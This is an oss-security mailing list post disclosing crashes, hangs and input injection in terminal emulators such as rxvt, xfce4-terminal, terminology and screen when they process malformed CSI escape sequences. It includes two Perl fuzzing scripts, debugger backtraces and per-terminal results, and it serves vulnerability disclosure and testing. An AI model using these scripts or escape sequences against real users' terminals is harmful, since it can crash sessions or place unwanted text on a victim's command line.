@@ -1,0 +1,258 @@
+
+Date: Mon, 1 May 2017 18:44:28 +0200
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: terminal emulators' processing of escape sequences
+
+Hi,
+
+It is a well-known feature, previously discussed in here, that data
+printed to a terminal (emulator) may control that terminal, including
+making it effectively unusable until reset, and in some cases even
+pasting characters as if they were typed by the user.  Also as discussed
+what characters may be pasted varies by terminal - sometimes they can be
+arbitrary (e.g., if the terminal supports macro recording and playback
+via escape sequences) and sometimes not so (like a terminal reporting
+back its status, usually not followed by a linefeed, so not yet
+executing a shell command until further user assistance).  Here are some
+relevant threads:
+
+http://www.openwall.com/lists/oss-security/2015/08/11/8
+http://www.openwall.com/lists/oss-security/2015/09/17/5
+http://www.openwall.com/lists/oss-security/2016/11/04/12
+
+(I link to messages that started these threads, not necessarily to most
+informative messages in the threads.  So you might want to go through
+the threads with the "thread-next" links.)
+
+Besides (mis)features, there may also be implementation bugs.  A couple
+of weeks ago, I brought in here vulnerabilities in terminal escape
+handling in minicom and prl-vzvncserver (both already fixed in latest
+versions by then):
+
+http://www.openwall.com/lists/oss-security/2017/04/18/5
+
+I already knew this wouldn't be the end of the story as some other
+terminal emulators exhibited suspicious behavior when targeted with
+streams of unusual escape sequences involving large or negative integer
+parameters.  I sent the following to the distros list on April 17,
+presented here with updates reflecting the current status.
+
+I wrote a script, and indeed there are crashes:
+
+---
+#!/usr/bin/perl
+
+# List of numbers stolen from vncrush.pl
+@numbers = ('0', '-0', '1', '-1', '32767', '-32768', '2147483647', '-2147483647', '2147483648', '-2147483648',
+              '4294967294', '4294967295', '4294967296', '357913942', '-357913942', '536870912', '-536870912',
+              '1.79769313486231E+308', '3.39519326559384E-313', '99999999999', '-99999999999', '0x100', '0x1000',
+              '0x3fffffff', '0x7ffffffe', '0x7fffffff', '0x80000000', '0xffff', '0xfffffffe', '0xfffffff', '0xffffffff',
+              '0x10000', '0x100000', '0x99999999', '65535', '65536', '65537', '16777215', '16777216', '16777217', '-268435455');
+
+sub test
+{
+	local $what = shift;
+	print "Testing CSI $what\n";
+	print "\033[" . $what . "first\nsecond\n";
+#	print "\233" . $what . "first\nsecond\n";
+}
+
+foreach $n1 (@numbers) {
+	for ($c = 0; $c < 256; $c++) {
+		test($n1 . chr($c));
+		foreach $n2 (@numbers) {
+			test($n1 . ";" . $n2 . chr($c));
+		}
+	}
+}
+---
+
+rxvt:
+
+---
+Program received signal SIGSEGV, Segmentation fault.
+0x000055555556a560 in rxvt_scroll_text.part ()
+(gdb) bt
+#0  0x000055555556a560 in rxvt_scroll_text.part ()
+#1  0x00005555555602eb in rxvt_process_csi_seq ()
+#2  0x00005555555607a7 in rxvt_main_loop ()
+#3  0x000055555555c1eb in main ()
+
+   0x000055555556a540 <+512>:	cmp    %r15,%rbp
+   0x000055555556a543 <+515>:	je     0x55555556a5d0 <rxvt_scroll_text.part.4+656>
+   0x000055555556a549 <+521>:	mov    0x198(%rbx),%rdx
+   0x000055555556a550 <+528>:	xor    %ecx,%ecx
+   0x000055555556a552 <+530>:	test   %r14d,%r14d
+   0x000055555556a555 <+533>:	mov    %cx,(%rdx,%rax,1)
+   0x000055555556a559 <+537>:	mov    0x178(%rbx),%rdx
+=> 0x000055555556a560 <+544>:	mov    (%rdx,%rbp,1),%rcx
+   0x000055555556a564 <+548>:	mov    0x190(%rbx),%rdx
+   0x000055555556a56b <+555>:	mov    %rcx,(%rdx,%r12,1)
+   0x000055555556a56f <+559>:	mov    0x180(%rbx),%rdx
+   0x000055555556a576 <+566>:	mov    (%rdx,%rbp,1),%rcx
+   0x000055555556a57a <+570>:	mov    0x1a0(%rbx),%rdx
+   0x000055555556a581 <+577>:	mov    %rcx,(%rdx,%r12,1)
+   0x000055555556a585 <+581>:	jne    0x55555556a530 <rxvt_scroll_text.part.4+496>
+
+(gdb) p/x $rdx
+$1 = 0x5555557dd0c0
+(gdb) p/x $rbp
+$2 = 0x3fffffff8
+---
+
+I did not investigate this closely.
+
+Jason A. Donenfeld of Gentoo volunteered to investigate it, and came up
+with findings that he's to post to oss-security on his own.
+
+xfce4-terminal:
+
+---
+(xfce4-terminal:10050): Gdk-ERROR **: The program 'xfce4-terminal' received an X Window System error.
+This probably reflects a bug in the program.
+The error was 'BadAlloc (insufficient resources for operation)'.
+  (Details: serial 54787 error_code 11 request_code 12 minor_code 0)
+  (Note to programmers: normally, X errors are reported asynchronously;
+   that is, you will receive the error a while after causing it.
+   To debug your program, run it with the --sync command line
+   option to change this behavior. You can then get a meaningful
+   backtrace from your debugger if you break on the gdk_x_error() function.)
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x00007ffff5b3b86b in g_logv () from /lib64/libglib-2.0.so.0
+(gdb) bt
+#0  0x00007ffff5b3b86b in g_logv () at /lib64/libglib-2.0.so.0
+#1  0x00007ffff5b3b9df in g_log () at /lib64/libglib-2.0.so.0
+#2  0x00007ffff6d04b10 in gdk_x_error () at /lib64/libgdk-x11-2.0.so.0
+#3  0x00007ffff784139d in _XError () at /lib64/libX11.so.6
+#4  0x00007ffff783e227 in handle_error () at /lib64/libX11.so.6
+#5  0x00007ffff783e2e5 in handle_response () at /lib64/libX11.so.6
+#6  0x00007ffff783eca5 in _XEventsQueued () at /lib64/libX11.so.6
+#7  0x00007ffff78306a7 in XPending () at /lib64/libX11.so.6
+#8  0x00007ffff6cf8e8e in gdk_event_check () at /lib64/libgdk-x11-2.0.so.0
+#9  0x00007ffff5b34bd1 in g_main_context_check () at /lib64/libglib-2.0.so.0
+#10 0x00007ffff5b35130 in g_main_context_iterate.isra () at /lib64/libglib-2.0.so.0
+#11 0x00007ffff5b35512 in g_main_loop_run () at /lib64/libglib-2.0.so.0
+#12 0x00007ffff70a2667 in gtk_main () at /lib64/libgtk-x11-2.0.so.0
+#13 0x000055555556327a in main ()
+---
+
+and gnome-terminal looks similar, also taking down the parent
+ghome-terminal (perhaps via their shared server).  Again I did not
+investigate this, but unlike rxvt these crashes look only indirectly
+related to the escapes.
+
+Yves-Alexis Perez of Debian pointed out that whether these crashes occur
+or not may be related to the version of vte.  I'll leave it up to him to
+post a follow-up on that.
+
+terminology:
+
+---
+ERR<10676>:termpty termptyesc.c:1115 _handle_esc_csi() unhandled CSI 'x': 2147483647;0x
+ERR<10676>:termpty termptyesc.c:1115 _handle_esc_csi() unhandled CSI 'x': 2147483647;0x
+ERR<10676>:termpty termptyesc.c:1115 _handle_esc_csi() unhandled CSI 'x': 2147483647;0x
+---
+
+and so on, where it effectively locks up (is stuck re-processing this
+same escape sequence in an endless loop?)  Before reaching this point,
+it plays funny music.
+
+Several others sort of passed the test - no crash, but then it's typical
+to see something injected onto the shell command line, e.g. in lilyterm
+it's "62;9;cx62;9;cx62;[...];9;cxxxxxxxxxxxxxxxxxxxxxxxxx[...]", where I
+omitted (denoted with "[...]") many other repeats of "9;cx62" and many
+more "x" characters.  I've seen similar injected strings from running
+this script on many other terminals.  There was no automatic shell
+command execution - the person would still need to press Enter in order
+to be fully trapped.
+
+Note that my trivial script does not test for an equivalent to minicom's
+escparms[] array overflow - that would need to be tested separately.
+Also, many more orderings of the escape commands (e.g., setting up a
+scroll region and then moving the cursor) and many more integer values
+may be tested.
+
+Unfortunately, I did not record which terminal emulators did not crash
+for me.  However, Jason recorded both kinds of results for him, coming
+up with:
+
+Konsole: no crash
+Xterm: no crash
+rxvt: crash
+Yakuake: no crash
+Mosh (which is a terminal emulator, after all): no crash
+Screen: 100% CPU usage --> DoS
+rxvt-unicode: no crash
+Qterminal: no crash
+putty: no crash
+
+This adds "screen" to terminal emulators with problematic processing of
+terminal escapes.  Due to minor known impact, we did not handle this
+under embargo - it should be investigated and fixed now, in public.
+
+For testing minicom, which sort of passed the test (short for the known
+escparms[] buffer overflow), I used a different revision of the script:
+
+---
+#!/usr/bin/perl
+
+# List of numbers stolen from vncrush.pl
+@numbers = ('0', '-0', '1', '-1', '32767', '-32768', '2147483647', '-2147483647', '2147483648', '-2147483648',
+              '4294967294', '4294967295', '4294967296', '357913942', '-357913942', '536870912', '-536870912',
+              '1.79769313486231E+308', '3.39519326559384E-313', '99999999999', '-99999999999', '0x100', '0x1000',
+              '0x3fffffff', '0x7ffffffe', '0x7fffffff', '0x80000000', '0xffff', '0xfffffffe', '0xfffffff', '0xffffffff',
+              '0x10000', '0x100000', '0x99999999', '65535', '65536', '65537', '16777215', '16777216', '16777217', '-268435455');
+
+sub test
+{
+	local $what = shift;
+	print STDERR "Testing CSI $what\n";
+	do {
+		open(PIPE, "> fifo") || die;
+		print PIPE "\033[" . $what . "first\nsecond\n";
+	} until (close(PIPE));
+#	select undef, undef, undef, 0.02;
+}
+
+$SIG{'PIPE'} = 'IGNORE';
+
+foreach $n1 (@numbers) {
+	for ($c = 0; $c < 256; $c++) {
+		test($n1 . chr($c));
+		foreach $n2 (@numbers) {
+			test($n1 . ";" . $n2 . chr($c));
+		}
+	}
+}
+---
+
+In my testing, this script sometimes unintentionally triggers the
+escparms[] overflow in minicom.  I guess this is because of its
+non-perfect handling of the named pipe's buffer filling up (partial data
+from a previous write gets concatenated with attempted next write).
+This also means that occasionally it will miss testing some of the
+sequences as intended.  I am saying this now primarily so that none of
+you get alarmed by unpatched minicom crashing on some runs of that
+script - this does not necessarily indicate the script triggers another
+issue of this kind, even though it does not probe for the escparms[]
+overflow explicitly.
+
+One thing we mostly haven't tried yet (except on prl-vzvncserver) is
+applying this kind of fuzzing/testing to ASan-enabled builds of
+terminals; doing so may reveal dormant issues, which with some code
+review and better targeted attacks could be awoken in regular builds as
+well.  Another thing we mostly haven't tried yet (except for
+prl-vzvncserver and to a lesser extent minicom) is old-fashioned manual
+code review.  This too may result in findings that a specific script
+would miss.
+
+I'll stop here, expecting that Jason and Yves-Alexis will post
+follow-ups, and the wider oss-security community will do some more
+testing and fuzzing of terminal escapes, as well as hopefully code
+reviews, likely finding more issues.
+
+Thanks,
+
+Alexander
